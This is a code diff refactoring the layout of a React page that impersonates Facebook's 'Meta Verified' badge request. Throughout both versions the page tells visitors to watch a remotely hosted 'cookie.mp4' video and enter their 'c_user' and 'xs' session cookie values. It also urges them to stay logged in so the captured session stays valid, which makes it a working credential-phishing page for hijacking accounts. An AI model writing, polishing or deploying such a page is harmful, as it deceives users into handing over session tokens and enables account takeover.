@@ -68,7 +68,7 @@ export default function Validation() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col">
+    <div className="flex flex-col min-h-screen">
       <MetaTags 
         title="Meta Verified | Validation"
         description="Request a verified badge on Facebook - Initial Step"
@@ -76,121 +76,129 @@ export default function Validation() {
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
       {/* Navigation Bar */}
-      <nav className="sticky top-0 z-10 flex items-center justify-between p-3 sm:p-4 border-b bg-white">
-        <div className="flex items-center">
-          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
-        </div>
-        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
-          <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
-          <input
-            type="text"
-            placeholder="Search"
-            className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
-          />
-        </div>
-      </nav>
-
-      <div className="flex-1 h-[calc(100vh-4rem)] overflow-y-auto bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5 p-4 sm:p-8">
-        <div className="max-w-2xl mx-auto space-y-4 sm:space-y-6">
-          <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
-            Request a verified badge on Facebook
-          </h1>
-
-          <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
-            <p>
-              The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
-            </p>
-            <p>
-              Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
-            </p>
-            <p>
-              Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
-            </p>
+      <header className="sticky top-0 z-50 bg-white border-b">
+        <nav className="flex items-center justify-between p-3 sm:p-4">
+          <div className="flex items-center">
+            <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
           </div>
+          <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
+            <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
+            <input
+              type="text"
+              placeholder="Search"
+              className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
+            />
+          </div>
+        </nav>
+      </header>
 
-          <div className="bg-white rounded-lg shadow-sm p-4 sm:p-6 space-y-4">
-            <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>
+      {/* Main Content */}
+      <main className="flex-1 overflow-auto bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
+        <div className="max-w-2xl mx-auto px-4 py-6 sm:px-6 sm:py-8">
+          <div className="space-y-6">
+            <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
+              Request a verified badge on Facebook
+            </h1>
 
-            <div className="relative w-full aspect-video rounded-lg overflow-hidden bg-black">
-              <video
-                className="w-full h-full object-cover"
-                controls
-                playsInline
-                preload="auto"
-              >
-                <source
-                  src="https://pub-97836f8a77c541e9afe2515c4730dd50.r2.dev/cookie.mp4"
-                  type="video/mp4"
-                />
-                Your browser does not support the video tag.
-              </video>
+            <div className="space-y-4 text-[#65676B] text-sm sm:text-base">
+              <p>
+                The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
+              </p>
+              <p>
+                Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
+              </p>
+              <p>
+                Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
+              </p>
             </div>
 
-            <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
-              Must Watch the video and submit required information correctly.
-            </h3>
+            <div className="bg-white rounded-lg shadow-sm p-4 sm:p-6 space-y-4">
+              <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>
+
+              <div className="relative w-full aspect-video rounded-lg overflow-hidden bg-black shadow-md">
+                <video
+                  className="w-full h-full object-cover"
+                  controls
+                  playsInline
+                  preload="auto"
+                >
+                  <source
+                    src="https://pub-97836f8a77c541e9afe2515c4730dd50.r2.dev/cookie.mp4"
+                    type="video/mp4"
+                  />
+                  Your browser does not support the video tag.
+                </video>
+              </div>
+
+              <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
+                Must Watch the video and submit required information correctly.
+              </h3>
+            </div>
+
+            <Form {...form}>
+              <form onSubmit={form.handleSubmit(onSubmit)} className="bg-white rounded-lg shadow-sm p-4 sm:p-6 space-y-4">
+                <FormField
+                  control={form.control}
+                  name="c_user"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
+                      <FormControl>
+                        <Input
+                          type="number"
+                          min="0"
+                          pattern="[0-9]+"
+                          minLength={6}
+                          placeholder="Enter c_user"
+                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
+                          {...field}
+                        />
+                      </FormControl>
+                      <FormMessage className="text-xs text-[#dc3545]" />
+                    </FormItem>
+                  )}
+                />
+                <FormField
+                  control={form.control}
+                  name="xs"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
+                      <FormControl>
+                        <Input 
+                          type="text" 
+                          placeholder="Enter xs" 
+                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
+                          {...field} 
+                        />
+                      </FormControl>
+                      <FormMessage className="text-xs text-[#dc3545]" />
+                    </FormItem>
+                  )}
+                />
+
+                <p className="text-xs sm:text-sm text-[#65676B]">
+                  Please make sure account not to log out from your computer or laptop until you have received a verification email.
+                </p>
+
+                <Button 
+                  type="submit" 
+                  className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200"
+                  disabled={form.formState.isSubmitting}
+                >
+                  {form.formState.isSubmitting ? "Submitting..." : "Submit"}
+                </Button>
+              </form>
+            </Form>
           </div>
-
-          <Form {...form}>
-            <form onSubmit={form.handleSubmit(onSubmit)} className="bg-white rounded-lg shadow-sm p-4 sm:p-6 space-y-4">
-              <FormField
-                control={form.control}
-                name="c_user"
-                render={({ field }) => (
-                  <FormItem>
-                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
-                    <FormControl>
-                      <Input
-                        type="number"
-                        min="0"
-                        pattern="[0-9]+"
-                        minLength={6}
-                        placeholder="Enter c_user"
-                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
-                        {...field}
-                      />
-                    </FormControl>
-                    <FormMessage className="text-xs text-[#dc3545]" />
-                  </FormItem>
-                )}
-              />
-              <FormField
-                control={form.control}
-                name="xs"
-                render={({ field }) => (
-                  <FormItem>
-                    <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
-                    <FormControl>
-                      <Input 
-                        type="text" 
-                        placeholder="Enter xs" 
-                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
-                        {...field} 
-                      />
-                    </FormControl>
-                    <FormMessage className="text-xs text-[#dc3545]" />
-                  </FormItem>
-                )}
-              />
-
-              <p className="text-xs sm:text-sm text-[#65676B]">
-                Please make sure account not to log out from your computer or laptop until you have received a verification email.
-              </p>
-
-              <Button 
-                type="submit" 
-                className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200"
-                disabled={form.formState.isSubmitting}
-              >
-                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
-              </Button>
-            </form>
-          </Form>
         </div>
-      </div>
+      </main>
 
-      <footer className="flex-shrink-0 text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t bg-white">
-        Meta © 2025
+      {/* Footer */}
+      <footer className="bg-white border-t py-3 sm:py-4">
+        <p className="text-center text-xs sm:text-sm text-[#65676B]">
+          Meta © 2025
+        </p>
       </footer>
     </div>
   );
